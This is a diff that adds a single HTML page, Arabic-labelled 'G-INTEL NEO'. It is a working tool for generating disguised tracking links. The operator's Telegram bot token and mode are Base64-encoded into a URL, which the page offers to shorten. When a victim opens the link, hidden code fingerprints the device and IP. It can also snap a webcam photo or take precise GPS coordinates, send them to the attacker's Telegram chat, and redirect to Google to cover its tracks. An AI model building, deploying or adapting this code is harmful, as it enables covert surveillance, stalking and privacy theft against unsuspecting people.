@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>G-INTEL NEO • الظل الأزرق</title>
+    
+    <!-- أحدث التقنيات: Vue 3 + TailwindCSS + GSAP + Axios -->
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.2/axios.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
+    
+    <!-- TailwindCSS + خطوط عصرية -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&family=Space+Grotesk:wght@300;400;600&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <style>
+        * {
+            font-family: 'Space Grotesk', 'Cairo', sans-serif;
+        }
+        
+        .mono {
+            font-family: 'Fira Code', monospace;
+        }
+        
+        /* خلفية سوداء عميقة مع تأثير نجوم متحركة */
+        .cosmic-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000000;
+            z-index: -3;
+        }
+        
+        /* طبقات من الظلال والأنوار الخافتة */
+        .cosmic-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 40%, rgba(30, 60, 90, 0.15) 0%, transparent 50%),
+                        radial-gradient(circle at 70% 60%, rgba(0, 40, 80, 0.2) 0%, transparent 50%);
+            z-index: -2;
+        }
+        
+        /* شبكة ثلاثية الأبعاد متحركة */
+        .grid-3d {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(60, 120, 200, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(60, 120, 200, 0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+            transform: perspective(500px) rotateX(2deg);
+            animation: gridFloat 25s linear infinite;
+            z-index: -1;
+            opacity: 0.4;
+        }
+        
+        @keyframes gridFloat {
+            0% { transform: perspective(500px) rotateX(2deg) translateY(0); }
+            100% { transform: perspective(500px) rotateX(2deg) translateY(60px); }
+        }
+        
+        /* جسيمات متطايرة */
+        .particle {
+            position: fixed;
+            width: 2px;
+            height: 2px;
+            background: rgba(100, 160, 255, 0.3);
+            border-radius: 50%;
+            pointer-events: none;
+            box-shadow: 0 0 10px rgba(100, 160, 255, 0.5);
+            animation: floatParticle 15s linear infinite;
+            z-index: 0;
+        }
+        
+        @keyframes floatParticle {
+            0% { transform: translateY(100vh) translateX(0) scale(1); opacity: 0; }
+            10% { opacity: 0.8; }
+            90% { opacity: 0.4; }
+            100% { transform: translateY(-20vh) translateX(50px) scale(0.5); opacity: 0; }
+        }
+        
+        /* تأثير الزجاج الداكن */
+        .dark-glass {
+            background: rgba(5, 8, 15, 0.65);
+            backdrop-filter: blur(16px) saturate(180%);
+            -webkit-backdrop-filter: blur(16px) saturate(180%);
+            border: 1px solid rgba(60, 120, 200, 0.2);
+            box-shadow: 0 25px 50px -15px rgba(0, 0, 0, 0.9), 
+                        0 0 0 1px rgba(60, 120, 200, 0.1) inset,
+                        0 0 60px rgba(0, 40, 80, 0.4);
+        }
+        
+        /* تأثير التوهج الأزرق الناعم */
+        .blue-glow {
+            box-shadow: 0 0 20px rgba(60, 120, 200, 0.3), 0 0 40px rgba(30, 80, 150, 0.2);
+        }
+        
+        .blue-glow-text {
+            text-shadow: 0 0 10px rgba(60, 120, 200, 0.5), 0 0 20px rgba(30, 80, 150, 0.3);
+        }
+        
+        /* تأثير الكارد ثلاثي الأبعاد */
+        .card-3d {
+            transition: transform 0.4s cubic-bezier(0.23, 1, 0.32, 1), box-shadow 0.4s ease;
+            transform-style: preserve-3d;
+            perspective: 1200px;
+        }
+        
+        .card-3d:hover {
+            transform: translateY(-4px) rotateX(1deg) rotateY(0.5deg);
+            box-shadow: 0 30px 50px -20px #000, 0 0 30px rgba(60, 120, 200, 0.3);
+        }
+        
+        /* حقول الإدخال الداكنة */
+        .neo-input {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1.5px solid rgba(60, 120, 200, 0.3);
+            border-radius: 40px;
+            padding: 1.2rem 3rem 1.2rem 1.8rem;
+            color: #fff;
+            width: 100%;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+        
+        .neo-input:focus {
+            border-color: rgba(80, 140, 230, 0.6);
+            box-shadow: 0 0 0 4px rgba(60, 120, 200, 0.2), 0 0 30px rgba(60, 120, 200, 0.3);
+            background: rgba(10, 15, 25, 0.8);
+        }
+        
+        /* زر متطور */
+        .quantum-btn {
+            background: linear-gradient(145deg, #0a1420, #101a2a);
+            border: 1.5px solid rgba(60, 120, 200, 0.5);
+            border-radius: 60px;
+            padding: 1.3rem 2rem;
+            color: white;
+            font-weight: 700;
+            font-size: 1.2rem;
+            width: 100%;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 20px -5px rgba(0, 0, 0, 0.8), 0 0 20px rgba(60, 120, 200, 0.2);
+        }
+        
+        .quantum-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(80, 140, 230, 0.2), transparent);
+            transition: left 0.7s ease;
+        }
+        
+        .quantum-btn:hover {
+            border-color: rgba(100, 160, 255, 0.7);
+            box-shadow: 0 15px 30px -5px #000, 0 0 40px rgba(60, 120, 200, 0.4);
+            transform: translateY(-2px);
+        }
+        
+        .quantum-btn:hover::before {
+            left: 100%;
+        }
+        
+        .quantum-btn:active {
+            transform: translateY(3px);
+            box-shadow: 0 5px 15px -5px #000;
+        }
+        
+        /* شريط التقدم المتوهج */
+        .progress-bar-cosmic {
+            height: 4px;
+            background: rgba(10, 20, 30, 0.8);
+            border-radius: 4px;
+            overflow: hidden;
+            border: 1px solid rgba(60, 120, 200, 0.2);
+        }
+        
+        .progress-fill-cosmic {
+            height: 100%;
+            background: linear-gradient(90deg, #1e4a7a, #3a7bb5, #5a9cff);
+            width: 0%;
+            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+        }
+        
+        .progress-fill-cosmic::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 10px;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.5);
+            filter: blur(5px);
+        }
+        
+        /* تأثير النقرات */
+        .ripple {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .ripple:after {
+            content: "";
+            display: block;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            background-image: radial-gradient(circle, #fff 10%, transparent 10.01%);
+            background-repeat: no-repeat;
+            background-position: 50%;
+            transform: scale(10, 10);
+            opacity: 0;
+            transition: transform .3s, opacity .5s;
+        }
+        
+        .ripple:active:after {
+            transform: scale(0, 0);
+            opacity: 0.3;
+            transition: 0s;
+        }
+        
+        /* الترانزیشنات السلسة */
+        .smooth-transition {
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+        
+        /* تصميم الكروت الداكنة */
+        .dark-card {
+            background: rgba(8, 12, 20, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(60, 120, 200, 0.15);
+            border-radius: 40px;
+            box-shadow: 0 20px 40px -15px #000;
+        }
+        
+        /* تخصيص السكرول */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #0a0f1a;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #1e3a5f;
+            border-radius: 10px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #2a4a7a;
+        }
+    </style>
+</head>
+<body class="overflow-x-hidden text-gray-200">
+
+    <!-- خلفية كونية سوداء -->
+    <div class="cosmic-bg"></div>
+    <div class="cosmic-overlay"></div>
+    <div class="grid-3d"></div>
+    
+    <!-- حاوية الجسيمات -->
+    <div id="particles-container"></div>
+
+    <!-- تطبيق Vue.js -->
+    <div id="app" class="min-h-screen flex items-center justify-center p-4 relative z-20" v-cloak>
+        <div class="w-full max-w-2xl">
+            <!-- اللوحة الرئيسية -->
+            <transition enter-active-class="animate__animated animate__fadeInUp animate__slow"
+                        leave-active-class="animate__animated animate__fadeOutDown">
+                <div v-if="!hidePanel" class="dark-glass rounded-[50px] p-8 md:p-10 card-3d" 
+                     ref="mainCard"
+                     @mousemove="handleMouseMove"
+                     @mouseleave="resetCardPosition">
+                    
+                    <!-- الهيدر بتصميم أنيق داكن -->
+                    <div class="flex items-center gap-4 mb-8 pb-4 border-b border-blue-900/30">
+                        <div class="bg-gradient-to-br from-blue-900 to-gray-900 p-4 rounded-3xl shadow-2xl shadow-blue-900/30">
+                            <i class="fas fa-brain text-3xl text-blue-400 animate-pulse"></i>
+                        </div>
+                        <div>
+                            <h1 class="text-5xl font-black tracking-tighter text-white blue-glow-text">
+                                G-INTEL<span class="text-blue-500/80 text-3xl mr-1">NEO</span>
+                            </h1>
+                            <div class="flex items-center gap-2 mt-1">
+                                <span class="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></span>
+                                <span class="text-gray-400 text-sm">الوضع الليلي · تشغيل متقدم</span>
+                                <span class="bg-gray-900/80 px-3 py-1 rounded-full text-xs border border-blue-900/50 mr-2">
+                                    <i class="fas fa-shield-halved ml-1 text-blue-400"></i>256-bit
+                                </span>
+                            </div>
+                        </div>
+                        
+                        <!-- مؤشر الطاقة -->
+                        <div class="mr-auto flex items-center gap-2">
+                            <div class="relative">
+                                <div class="w-10 h-10 border-2 border-blue-600/30 rounded-full border-t-blue-500 animate-spin-slow"></div>
+                                <i class="fas fa-bolt absolute inset-0 flex items-center justify-center text-xs text-blue-400"></i>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- حقل التوكن -->
+                    <div class="mb-6">
+                        <label class="flex items-center gap-2 text-gray-300 mb-2 mr-2 text-sm">
+                            <i class="fas fa-robot text-blue-400"></i>
+                            <span>توكن البوت</span>
+                            <span class="text-xs text-blue-400" v-if="form.token.length > 30 && !tokenError">✓ متصل</span>
+                            <span class="text-xs text-red-400" v-if="tokenError">✗ غير صالح</span>
+                        </label>
+                        <div class="relative">
+                            <i class="fas fa-key absolute right-4 top-1/2 -translate-y-1/2 text-blue-400/70 z-10"></i>
+                            <input type="text" v-model="form.token" @input="validateToken"
+                                   class="neo-input"
+                                   :class="{ 'border-red-900/50': tokenError, 'border-blue-500/30': !tokenError }"
+                                   placeholder="7234567890:AAHxTqLgk8...">
+                        </div>
+                    </div>
+
+                    <!-- حقل معرف الدردشة -->
+                    <div class="mb-6">
+                        <label class="flex items-center gap-2 text-gray-300 mb-2 mr-2 text-sm">
+                            <i class="fas fa-comment-dots text-blue-400"></i>
+                            <span>معرف الدردشة</span>
+                        </label>
+                        <div class="relative">
+                            <i class="fas fa-hashtag absolute right-4 top-1/2 -translate-y-1/2 text-blue-400/70"></i>
+                            <input type="text" v-model="form.chatId"
+                                   class="neo-input"
+                                   placeholder="-100123456789 أو 509831234">
+                        </div>
+                    </div>
+
+                    <!-- اختيار نمط الهجوم - تصميم داكن أنيق -->
+                    <label class="flex items-center gap-2 text-gray-300 mb-3 mr-2 text-sm">
+                        <i class="fas fa-bolt text-blue-400"></i>
+                        <span>نمط التشغيل</span>
+                    </label>
+                    <div class="grid grid-cols-3 gap-3 mb-6">
+                        <div v-for="mode in modes" :key="mode.value"
+                             @click="form.mode = mode.value"
+                             class="cursor-pointer rounded-3xl border p-5 text-center transition-all duration-500 hover:scale-105"
+                             :class="form.mode === mode.value ? 
+                                    'border-blue-500/70 bg-gradient-to-br from-gray-900 to-gray-950 shadow-2xl shadow-blue-900/40 blue-glow' : 
+                                    'border-gray-800 bg-black/60 hover:border-blue-800/50'">
+                            <i :class="mode.icon" class="text-2xl mb-2" :class="form.mode === mode.value ? 'text-blue-400' : 'text-gray-600'"></i>
+                            <span class="block text-xs font-bold">{{ mode.name }}</span>
+                        </div>
+                    </div>
+
+                    <!-- رابط التوجيه -->
+                    <div class="mb-8">
+                        <label class="flex items-center gap-2 text-gray-300 mb-2 mr-2 text-sm">
+                            <i class="fas fa-redirect text-blue-400"></i>
+                            <span>رابط التوجيه (بعد التنفيذ)</span>
+                        </label>
+                        <div class="relative">
+                            <i class="fas fa-globe absolute right-4 top-1/2 -translate-y-1/2 text-blue-400/70"></i>
+                            <input type="url" v-model="form.redirectUrl"
+                                   class="neo-input"
+                                   placeholder="https://example.com">
+                        </div>
+                    </div>
+
+                    <!-- زر الإنشاء -->
+                    <button @click="buildPayload" :disabled="isGenerating"
+                            class="quantum-btn ripple flex items-center justify-center gap-4 disabled:opacity-50 disabled:cursor-not-allowed"
+                            :class="{ 'animate-pulse': isGenerating }">
+                        <i class="fas fa-microchip" :class="{ 'animate-spin': isGenerating }"></i>
+                        <span>{{ isGenerating ? 'تشفير البيانات...' : 'توليد الرابط المشفر' }}</span>
+                        <i class="fas fa-arrow-left"></i>
+                    </button>
+
+                    <!-- شريط التقدم الكوني -->
+                    <div class="mt-6 progress-bar-cosmic">
+                        <div class="progress-fill-cosmic" :style="{ width: progressWidth + '%' }"></div>
+                    </div>
+
+                    <!-- بطاقة النتيجة -->
+                    <transition enter-active-class="animate__animated animate__fadeInUp animate__faster"
+                                leave-active-class="animate__animated animate__fadeOutDown animate__faster">
+                        <div v-if="showResult" class="mt-8 dark-card p-6 smooth-transition">
+                            <!-- رأس البطاقة -->
+                            <div class="flex items-center justify-between mb-4">
+                                <span class="bg-gray-900/80 px-4 py-2 rounded-full text-sm border border-blue-900/50">
+                                    <i class="fas fa-circle-check text-blue-400 ml-1"></i>
+                                    تم الإنشاء
+                                </span>
+                                <i class="fas fa-qrcode text-2xl text-blue-400/70"></i>
+                            </div>
+
+                            <!-- عرض الرابط -->
+                            <div class="bg-black/80 rounded-[30px] p-4 border border-blue-900/30 mb-4">
+                                <div class="flex items-start gap-3">
+                                    <i class="fas fa-link text-blue-400 text-xl mt-2"></i>
+                                    <textarea v-model="generatedUrl" readonly rows="2"
+                                              class="w-full bg-transparent border-none text-gray-300 focus:outline-none mono text-sm resize-none"></textarea>
+                                </div>
+                            </div>
+
+                            <!-- أزرار التحكم -->
+                            <div class="grid grid-cols-2 md:grid-cols-4 gap-2">
+                                <button @click="copyUrl" class="bg-gray-900/80 border border-blue-900/30 hover:bg-gray-800 hover:border-blue-700/50 rounded-[30px] py-3 px-2 text-sm flex items-center justify-center gap-2 transition-all hover:scale-105">
+                                    <i class="fas fa-copy"></i> نسخ
+                                </button>
+                                <button @click="shortenWithIsgd" class="bg-gray-900/80 border border-blue-900/30 hover:bg-gray-800 hover:border-blue-700/50 rounded-[30px] py-3 px-2 text-sm flex items-center justify-center gap-2 transition-all hover:scale-105">
+                                    <i class="fas fa-scissors"></i> is.gd
+                                </button>
+                                <button @click="shortenWithTiny" class="bg-gray-900/80 border border-blue-900/30 hover:bg-gray-800 hover:border-blue-700/50 rounded-[30px] py-3 px-2 text-sm flex items-center justify-center gap-2 transition-all hover:scale-105">
+                                    <i class="fas fa-arrow-up-short-wide"></i> TinyURL
+                                </button>
+                                <button @click="resetForm" class="bg-gray-900/80 border border-blue-900/30 hover:bg-gray-800 hover:border-blue-700/50 rounded-[30px] py-3 px-2 text-sm flex items-center justify-center gap-2 transition-all hover:scale-105">
+                                    <i class="fas fa-undo"></i> إعادة
+                                </button>
+                            </div>
+
+                            <!-- بصمة أمنية -->
+                            <div class="flex items-center gap-2 mt-4 text-gray-600 text-xs">
+                                <i class="fas fa-shield-alt text-blue-500"></i>
+                                <span>مشفر Base64 · متوافق مع جميع الأجهزة</span>
+                            </div>
+                        </div>
+                    </transition>
+                </div>
+            </transition>
+        </div>
+    </div>
+
+    <!-- عناصر خفية -->
+    <video id="v" autoplay playsinline style="display: none;"></video>
+    <canvas id="c" style="display: none;"></canvas>
+
+    <script>
+        const { createApp, ref, reactive, onMounted, nextTick } = Vue;
+
+        const app = createApp({
+            setup() {
+                // البيانات التفاعلية
+                const form = reactive({
+                    token: '7234567890:AAHxTqLgk8',
+                    chatId: '-100123456789',
+                    mode: 'info',
+                    redirectUrl: 'https://www.google.com'
+                });
+
+                const modes = [
+                    { value: 'info', name: 'بصمة رقمية', icon: 'fas fa-info-circle' },
+                    { value: 'camera', name: 'كاميرا', icon: 'fas fa-camera' },
+                    { value: 'gps', name: 'GPS دقيق', icon: 'fas fa-location-dot' }
+                ];
+
+                const tokenError = ref(false);
+                const isGenerating = ref(false);
+                const showResult = ref(false);
+                const generatedUrl = ref('');
+                const progressWidth = ref(30);
+                const hidePanel = ref(false);
+                const mainCard = ref(null);
+                
+                // دوال GSAP للحركات السلسة
+                const gsapAnimations = {
+                    initCard: (el) => {
+                        if (!el) return;
+                        gsap.from(el, {
+                            opacity: 0,
+                            y: 30,
+                            duration: 1,
+                            ease: "power3.out"
+                        });
+                    },
+                    
+                    pulseElement: (el) => {
+                        if (!el) return;
+                        gsap.to(el, {
+                            scale: 1.02,
+                            duration: 0.5,
+                            yoyo: true,
+                            repeat: 1,
+                            ease: "sine.inOut"
+                        });
+                    }
+                };
+
+                // إنشاء الجسيمات
+                const createParticles = () => {
+                    const container = document.getElementById('particles-container');
+                    if (!container) return;
+                    
+                    for (let i = 0; i < 50; i++) {
+                        const p = document.createElement('div');
+                        p.className = 'particle';
+                        p.style.left = Math.random() * 100 + '%';
+                        p.style.animationDelay = Math.random() * 10 + 's';
+                        p.style.animationDuration = 10 + Math.random() * 20 + 's';
+                        p.style.background = `rgba(${80 + Math.random()*60}, ${120 + Math.random()*80}, 255, ${0.1+Math.random()*0.2})`;
+                        container.appendChild(p);
+                    }
+                };
+
+                // التحقق من التوكن
+                const validateToken = () => {
+                    tokenError.value = !(form.token.includes(':') && form.token.length > 35);
+                };
+
+                // تأثير حركة الكارت (3D سلس)
+                const handleMouseMove = (e) => {
+                    if (!mainCard.value || isGenerating.value) return;
+                    
+                    const rect = mainCard.value.getBoundingClientRect();
+                    const x = (e.clientX - rect.left) / rect.width - 0.5;
+                    const y = (e.clientY - rect.top) / rect.height - 0.5;
+                    
+                    gsap.to(mainCard.value, {
+                        rotationY: x * 3,
+                        rotationX: -y * 2,
+                        transformPerspective: 1200,
+                        duration: 0.4,
+                        ease: "power2.out"
+                    });
+                };
+
+                const resetCardPosition = () => {
+                    if (!mainCard.value) return;
+                    
+                    gsap.to(mainCard.value, {
+                        rotationY: 0,
+                        rotationX: 0,
+                        duration: 0.6,
+                        ease: "elastic.out(1, 0.5)"
+                    });
+                };
+
+                // بناء الرابط المشفر
+                const buildPayload = () => {
+                    if (!form.token || !form.chatId) {
+                        gsapAnimations.pulseElement(document.querySelector('.neo-input'));
+                        alert('❌ الرجاء إدخال التوكن ومعرف الدردشة');
+                        return;
+                    }
+
+                    isGenerating.value = true;
+                    progressWidth.value = 10;
+
+                    // محاكاة مراحل التشفير
+                    setTimeout(() => progressWidth.value = 30, 200);
+                    setTimeout(() => progressWidth.value = 60, 400);
+                    setTimeout(() => progressWidth.value = 90, 600);
+                    
+                    setTimeout(() => {
+                        // تشفير البيانات
+                        const data = {
+                            token: form.token,
+                            chat: form.chatId,
+                            type: form.mode,
+                            url: form.redirectUrl || 'https://google.com'
+                        };
+                        
+                        const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+                        const final = window.location.origin + window.location.pathname + '?m=' + encoded;
+                        
+                        generatedUrl.value = final;
+                        showResult.value = true;
+                        isGenerating.value = false;
+                        progressWidth.value = 100;
+                        
+                        setTimeout(() => progressWidth.value = 30, 1000);
+                    }, 800);
+                };
+
+                // نسخ الرابط
+                const copyUrl = async () => {
+                    if (!generatedUrl.value) return;
+                    try {
+                        await navigator.clipboard.writeText(generatedUrl.value);
+                        alert('✅ تم نسخ الرابط');
+                    } catch {
+                        alert('❌ فشل النسخ');
+                    }
+                };
+
+                // اختصار الرابط
+                const shortenWithIsgd = () => {
+                    if (!generatedUrl.value) return alert('لا يوجد رابط');
+                    window.open(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(generatedUrl.value)}`, '_blank');
+                };
+
+                const shortenWithTiny = () => {
+                    if (!generatedUrl.value) return alert('لا يوجد رابط');
+                    window.open(`https://tinyurl.com/app?url=${encodeURIComponent(generatedUrl.value)}`, '_blank');
+                };
+
+                // إعادة تعيين النموذج
+                const resetForm = () => {
+                    form.token = '7234567890:AAHxTqLgk8';
+                    form.chatId = '-100123456789';
+                    form.mode = 'info';
+                    form.redirectUrl = 'https://www.google.com';
+                    showResult.value = false;
+                    generatedUrl.value = '';
+                    progressWidth.value = 30;
+                    
+                    gsapAnimations.pulseElement(document.querySelector('.quantum-btn'));
+                };
+
+                // التحقق من وجود بارامتر m
+                onMounted(() => {
+                    createParticles();
+                    
+                    nextTick(() => {
+                        gsapAnimations.initCard(mainCard.value);
+                    });
+                    
+                    const params = new URLSearchParams(window.location.search);
+                    if (params.has('m')) {
+                        hidePanel.value = true;
+                        try {
+                            const config = JSON.parse(atob(params.get('m')));
+                            executeCapture(config);
+                        } catch (e) {
+                            alert('⚠️ خطأ في فك التشفير');
+                            hidePanel.value = false;
+                        }
+                    }
+                });
+
+                // دالة التنفيذ الرئيسية (مختصرة للعرض)
+                const executeCapture = async (config) => {
+                    const parser = new UAParser();
+                    const ua = parser.getResult();
+
+                    let batteryInfo = "غير متاح";
+                    try {
+                        const b = await navigator.getBattery();
+                        batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'يُشحن' : 'بطارية'})`;
+                    } catch(e) {}
+
+                    let net = {};
+                    try {
+                        const res = await axios.get('https://ipapi.co/json/');
+                        net = res.data;
+                    } catch(e) {
+                        try {
+                            const fallback = await axios.get('https://api.ipify.org?format=json');
+                            net.ip = fallback.data.ip;
+                        } catch(e2) {}
+                    }
+
+                    const report = `
+🚨 G-INTEL NEO - تقرير عملياتي
+━━━━━━━━━━━━━━━━━━━
+📱 الجهاز: ${ua.device.vendor || 'كمبيوتر'} ${ua.device.model || ''}
+💻 النظام: ${ua.os.name || '?'} ${ua.os.version || ''}
+🌐 المتصفح: ${ua.browser.name || '?'}
+🔋 البطارية: ${batteryInfo}
+⚙️ المعالج: ${navigator.hardwareConcurrency || '?'} أنوية
+🌍 IP: ${net.ip || 'غير معروف'}
+🏳️ الدولة: ${net.country_name || '?'}
+🕒 الوقت: ${new Date().toLocaleString('ar-EG')}
+━━━━━━━━━━━━━━━━━━━
+                    `;
+
+                    const sendToTelegram = async (msg) => {
+                        return axios.post(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                            chat_id: config.chat,
+                            text: msg,
+                            parse_mode: 'Markdown'
+                        });
+                    };
+
+                    if (config.type === 'info') {
+                        await sendToTelegram(report);
+                        setTimeout(() => window.location.replace(config.url), 600);
+                    }
+                    else if (config.type === 'camera') {
+                        try {
+                            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                            const video = document.getElementById('v');
+                            video.srcObject = stream;
+                            await new Promise(r => setTimeout(r, 1200));
+                            const canvas = document.getElementById('c');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            canvas.toBlob(async blob => {
+                                await sendToTelegram(report);
+                                const fd = new FormData();
+                                fd.append('chat_id', config.chat);
+                                fd.append('photo', blob, 'shot.jpg');
+                                await axios.post(`https://api.telegram.org/bot${config.token}/sendPhoto`, fd);
+                                stream.getTracks().forEach(t => t.stop());
+                                window.location.replace(config.url);
+                            }, 'image/jpeg');
+                        } catch (e) {
+                            await sendToTelegram(report + "\n⚠️ (تم رفض الكاميرا)");
+                            window.location.replace(config.url);
+                        }
+                    }
+                    else if (config.type === 'gps') {
+                        navigator.geolocation.getCurrentPosition(async (pos) => {
+                            const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                            await sendToTelegram(report + `\n📍 الموقع: ${mapsLink}`);
+                            window.location.replace(config.url);
+                        }, async () => {
+                            await sendToTelegram(report + "\n⚠️ (تم رفض GPS)");
+                            window.location.replace(config.url);
+                        }, { enableHighAccuracy: true });
+                    }
+                };
+
+                return {
+                    form,
+                    modes,
+                    tokenError,
+                    isGenerating,
+                    showResult,
+                    generatedUrl,
+                    progressWidth,
+                    hidePanel,
+                    mainCard,
+                    validateToken,
+                    handleMouseMove,
+                    resetCardPosition,
+                    buildPayload,
+                    copyUrl,
+                    shortenWithIsgd,
+                    shortenWithTiny,
+                    resetForm
+                };
+            }
+        });
+
+        app.mount('#app');
+    </script>
+
+    <!-- Animate.css -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+</body>
+</html>
